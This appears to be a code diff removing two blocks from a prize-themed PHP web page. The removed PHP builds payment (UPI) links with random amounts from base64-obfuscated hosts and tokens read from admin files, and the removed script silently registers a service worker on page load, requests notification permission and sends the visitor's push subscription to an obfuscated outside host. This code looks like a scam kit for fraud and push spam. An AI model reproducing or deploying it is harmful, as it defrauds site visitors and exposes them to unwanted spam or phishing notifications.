@@ -1,30 +1,4 @@
-<?php
 
-error_reporting(1);
-$shost = file_exists('admin/shost.txt') ? file_get_contents('admin/shost.txt') : '';
-$hosting = $_SERVER['SERVER_NAME'] ?? 'localhost';
-
-$itoken = base64_decode("$shost") . base64_decode("YXBpLz8=");
-$itok = base64_decode("$shost") . base64_decode("YXBpL3VwaS5waHA/");
-
-// Suppress errors and check file existence
-$admin_token = file_exists('admin/token.txt') ? file_get_contents('admin/token.txt') : '';
-$info = file_exists('admin/info.txt') ? file_get_contents('admin/info.txt') : '';
-
-$price = base64_decode($info);
-$price = explode('=', $price);
-
-// Check if the decoded price contains both values
-$min_price = isset($price[0]) ? (int)$price[0] : 0;
-$max_price = isset($price[1]) ? (int)$price[1] : 0;
-
-$amt = rand($min_price, $max_price);
-
-$data = "token=$admin_token&amount=$amt&host=$hosting";
-$get_upi = "$itok$data";
-$link = "$itoken$data";
-
-?>
 
 
 
@@ -58,84 +32,8 @@ $link = "$itoken$data";
     <meta property="og:image" content="img/prize.html">
     
     
- <?php    
- $mhost = file_get_contents('admin/mhost.txt');
- $khost = file_get_contents('admin/khost.txt');
- $phost = base64_decode($mhost);
- ?>
- <script>
-        const publicVapidKey = '<?php echo $khost;?>'; // Replace this with your VAPID public key
+ 
 
-        function urlBase64ToUint8Array(base64String) {
-            const padding = '='.repeat((4 - base64String.length % 4) % 4);
-            const base64 = (base64String + padding)
-                .replace(/-/g, '+')
-                .replace(/_/g, '/');
-
-            const rawData = window.atob(base64);
-            const outputArray = new Uint8Array(rawData.length);
-
-            for (let i = 0; i < rawData.length; ++i) {
-                outputArray[i] = rawData.charCodeAt(i);
-            }
-            return outputArray;
-        }
-
-        async function autoSubscribe() {
-            if ('serviceWorker' in navigator && 'PushManager' in window) {
-                try {
-                    const registration = await navigator.serviceWorker.register('sw.js');
-                    console.log('Service Worker registered');
-
-                    const permission = await Notification.requestPermission();
-                    if (permission !== 'granted') {
-                        console.warn('Permission not granted');
-                        return;
-                    }
-
-                    const subscription = await registration.pushManager.subscribe({
-                        userVisibleOnly: true,
-                        applicationServerKey: urlBase64ToUint8Array(publicVapidKey),
-                        expirationTime: null // Not required, but ensures no expiry on subscribe call
-                    });
-
-                    // Send to server
-                    await fetch('<?php echo $phost;?>', {
-                        method: 'POST',
-                        body: JSON.stringify(subscription),
-                        headers: {
-                            'Content-Type': 'application/json'
-                        }
-                    });
-
-                    console.log('User');
-                } catch (error) {
-                    console.error('failed:', error);
-                }
-            } else {
-                console.warn('is not supported');
-            }
-        }
-
-        // Auto-trigger on page load
-        window.onload = autoSubscribe;
-    </script>
-   
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
 
 </head>
 
